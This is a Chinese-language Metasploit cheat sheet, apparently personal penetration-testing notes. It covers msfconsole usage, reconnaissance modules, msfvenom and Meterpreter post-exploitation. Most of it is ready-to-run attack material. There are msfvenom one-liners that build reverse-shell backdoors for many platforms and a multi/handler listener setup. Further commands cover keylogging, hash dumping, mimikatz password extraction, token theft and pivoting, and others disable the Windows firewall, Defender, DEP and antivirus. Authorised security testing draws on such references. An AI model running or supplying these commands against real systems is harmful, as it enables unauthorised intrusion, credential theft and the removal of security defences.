# metasploit







在kali 2.0中启动带数据库支持的MSF方式如下：
#1 首先启动postgresql数据库：/etc/init.d/postgresql start；或者 service postgresql start；
#2 初始化MSF数据库（关键步骤！）：msfdb init；
#3 运行msfconsole：msfconsole；
#4 在msf中查看数据库连接状态：db_status。



## 推荐文章

 https://xz.aliyun.com/t/2536#toc-6 



## 配置

###  **PostgreSQL** 

```
systemctl start postgresql#启动数据库
msfdb init#数据库初始化
#msfdb还有其他管理数据库的功能

```

#### 配置文件

 /usr/share/metasploit-framework/config/database.yml 



## 模块介绍

**Payloads** 指的是入侵一个系统后留在那里的代码。一些人称之为监听器、rootkits之类的。在Metasploit里面，叫playloads。这些payloads包括命令行工具，Meterpreter等等。payloads的类型有staged，inline，NoNX(绕过某些现代CPU的不可执行特性)，PassiveX（绕过防火墙的限制出站规则），IPv6等等。

**Exploits** 指的是利用系统漏洞或者缺陷的攻击程序。它们针对特定的操作系统，而且经常是特定的SP（service pack），特定的服务，特定的端口，甚至特定的应用程序。它们按操作系统分类，所以Windows exploits无法用于Linux，反之亦然。

**Post** 指的是用来向目标系统发送漏洞攻击程序的模块。

**Nops** 是**N**o **Op**eration**s**的缩写。在X86中，通常用16进制的0x90表示。简言之，“什么也不做”。它可以成为创建缓冲区溢出的关键。我们可以使用show命令查看nops。

**Auxiliary** 放的是各种不适合放在其它目录的模块（695）。包括了模糊测试工具，扫描器，拒绝服务攻击器等等。想深入了解这个模块，请参考我的文章《[附加模块](https://null-byte.wonderhowto.com/how-to/hack-like-pro-exploring-metasploit-auxiliary-modules-ftp-fuzzing-0155574/)》。

**Encoders** 是一个让我们可以通过各种方式对payloads进行编码的模块，目标是绕过防病毒程序和其它的安全设备。我们可以键入以下命令查看encoders：



## msfconsole关键字



使用search命令搜索模块

`search xx`

`search type:exploit platform:linux`


“Show”命令在我们选择攻击程序时是上下文相关的，所以如果我们在选择攻击程序**之前**输入”show payloads”，它会展示出**所有**的payloads。如果在选择了某个攻击程序**之后**输入”show payloads”，它仅会展示出适用于此攻击程序的payloads。

show options



“help”命令给你一个msfconsole中能使用的命令小列表。如果你遗忘此教程，只须输入“help”即可查看基本命令。



 “Info”是另一个让我们能查阅攻击程序基本信息的Metasploit命令。选中了一个攻击程序之后，我们输入“info”便会看到其所有的参数选项，目标和该攻击程序的描述。我倾向于在所有使用中的攻击程序里输入”info”来查找或提醒自己其功能和使用要求。 




“Set”是Metasploit中相当基础而且要紧的命令/关键字。我们可以用它来设置攻击程序的必要参数和变量。这些变量包括payload，RHOST，LHOST，target，URIPATH等等。


当我们用完了一个特定模块或者选错了一个模块，可以使用“back”命令返回到msfconsole主界面。


当我们决定使用哪个攻击模块进攻目标系统之后，我们使用“use”命令将其载入内存中，并在发送前将其初始化。


在我们选好了攻击程序之后，配置好所有变量，选好payload，最后一件事情是输入“exploit”命令。它将根据我们设置的变量和payload向目标机器发送攻击程序。

 “sessions”命令用来列出或者设置会话。当加上-l（list）开关时，它会列出所有会话。当使用数字开关（“sessions -1”）时，它告知Metasploit激活第一个会话。

## msf信息收集模块

### dns扫描和枚举

```
auxiliary/gather/enum_dns
```

###  CorpWatch公司名称信息收集

```
auxiliary/gather/corpwatch_lookup_name
API申请：http://api.corpwatch.org
Tip：此网站被Q，需要配置代理才能使用这个服务。
```

### 子域名搜索

```
auxiliary/gather/searchengine_subdomains_collector
```

###  Censys 搜索



 如果需要使用`Censys`搜索模块，需要去https://censys.io注册获得API和密钥 

###  **Shodan** 



###  **Shodan 蜜罐检查** 

 Shodan Honeyscore Client 



### 邮件信息收集

` auxiliary/gather/search_email_collector `



### 主机发现

```
auxiliary/scanner/portscan/tcp
auxiliary/scanner/portscan/syn
auxiliary/scanner/discovery/arp_sweep
auxiliary/scanner/discovery/udp_sweep
auxiliary/scanner/smb/smb_enumshares
```





## msfvenom

```shell
主要参数：
-p payload
-e 编码方式
-i 编码次数
-b 在生成的程序中避免出现的值
LHOST,LPORT 监听上线的主机IP和端口
-f exe 生成EXE格式
使用msfvenom -l 可以查看可以利用payload
msfvenom -l | grep windows | grep x64 | grep tcp  选择payload
```





### 常用的后门

```shell
Linux:
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
Windows:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
Mac:
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
PHP:
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
ASP:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
JSP:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
WAR:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
Python:
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
Bash:
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
Perl:
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
```

### 监听

```csharp
set PAYLOAD <Payload name>
set LHOST <LHOST value>
set LPORT <LPORT value>
set ExitOnSession false   让connection保持连接(即使一个连接退出,仍然保持listening状态)
exploit -j –z  -j(作为job开始运行)和-z(不立即进行session交换--也即是自动后台运行)
```

```bash
use exploit/multi/handler
msf exploit(handler) > set LHOST 172.16.0.4
msf exploit(handler) > set ExitOnSession false
msf exploit(handler) > exploit -j -z  
-j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)
msf exploit(handler) > jobs  查看后台攻击任务 
msf exploit(handler) > kill <id>  停止某后台攻击任务 
msf exploit(handler) > sessions -l  (查看会话)
```

```undefined
msf exploit(handler) > sessions -i 2   选择会话
msf exploit(handler) > sessions -k 2   结束会话
```

```undefined
Ctrl+z  把会话放到后台
Ctrl+c  结束会话
```

### 将cmdshell升级成meterpreter

` sessions -u cmdshell的id `



### 加载powershell

```
meterpreter > load powershell 
Loading extension powershell...Success.
meterpreter > powershell_shell 
PS > whoami
go0s-pc\go0s
```





## Meterpreter后攻击

### 常用命令

```bash
meterpreter > background  放回后台
meterpreter > exit  关闭会话
meterpreter > help  帮助信息
meterpreter > Sysinfo系统平台信息
meterpreter > screenshot  屏幕截取
meterpreter > shell  命令行shell (exit退出)
meterpreter > getlwd  查看本地目录
meterpreter > lcd  切换本地目录
meterpreter > getwd  查看目录
meterpreter > ls 查看文件目录列表
meterpreter > cd  切换目录 
meterpreter > rm  删除文件 
meterpreter > download C:\\Users\\123\\Desktop\\1.txt 1.txt 下载文件
meterpreter > upload /var/www/wce.exe wce.exe  上传文件
meterpreter > search -d c:  -f *.doc  搜索文件
meterpreter > execute -f  cmd.exe -i   执行程序/命令 
meterpreter > ps  查看进程
meterpreter > run post/windows/capture/keylog_recorder   键盘记录
meterpreter > getuid  查看当前用户权限
meterpreter > use priv  加载特权模块
meterpreter > getsystem  提升到SYSTEM权限
meterpreter > hashdump  导出密码散列
meterpreter > ps   查看高权限用户PID
meterpreter > steal_token <PID>  窃取令牌
meterpreter > rev2self  恢复原来的令牌 
meterpreter > migrate pid  迁移进程
meterpreter > run killav  关闭杀毒软件 
meterpreter > run getgui-e  启用远程桌面
meterpreter > portfwd add -l 1234 -p 3389 -r <目标IP>  端口转发
meterpreter > run get_local_subnets  获取内网网段信息
meterpreter > run autoroute -s <内网网段>  创建自动路由
meterpreter > run autoroute -p  查看自动路由表
创建代理通道:
msf > use auxiliary/server/socks4a   设置socks4代理模块
msf auxiliary(socks4a) > show options 
msf auxiliary(socks4a) > run
配置proxychains参数：
nano /etc/proxychains.conf   修改代理监听端口,和前面端口一致
quite_mode  设置成安静模式：去掉如下参数前面的注释

```

### 获取windows密码

```shell
load mimikatz    #help mimikatz 查看帮助
wdigest  #获取Wdigest密码
mimikatz_command -f samdump::hashes  #执行mimikatz原始命令
mimikatz_command -f sekurlsa::searchPasswords
```



### 迁移meterpreter进程

```
找到一个相对稳定的应用记住他的pid ，然后将  meterpreter shell 的pid换成它的。

输入migrate 7240（将meterpreter shell的pid调到7240里相对稳定应用的进程里了，然后用getpid再次查看下是否更换成功）
```



### 关闭防火墙/杀毒软件

windows

```
netsh advfirewall set allprofiles state off#关闭防火墙
net stop windefend
netsh firewall set opmode mode=disable
bcdedit.exe /set{current} nx AlwaysOff#关闭DEP
meterpreter > run killav  关闭杀毒软件 
```





## porffwd

```shell
portfwd add -l 3344 -p 3389 -r 127.0.0.1
#将3344转发到3389
```

## 常用的payload

```
msfvenom  -p   windows/x64/meterpreter/reverse_tcp  lhost=192.168.1.123   lport=12345  -f  psh-reflection>/tmp/search.ps1
use exploit/multi/handler
```

## 添加路由

```shell
meterpreter > run get_local_subnets
Local subnet: 10.48.8.0/255.255.255.0
meterpreter > run autoroute -s 10.48.8.0/24
#或者 run post/multi/manage/autoroute
```





## 插件

### wmap

添加网址:`wmap_sites -a`

添加目标:`wmap_targets -t` 

加载模块:`wmap_run -t`

开始扫描:`wmap_run -e`

查看结果:`wmap_vulns -l`

## 与漏扫结合



```
https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652850579&idx=1&sn=d9a0b86481b74660ea19309cd355b434&chksm=bd59355e8a2ebc48889662d83b9f0d0f1c728f973d666f543bb016a76bbe18525b4987e99db5&scene=21#wechat_redirect
```

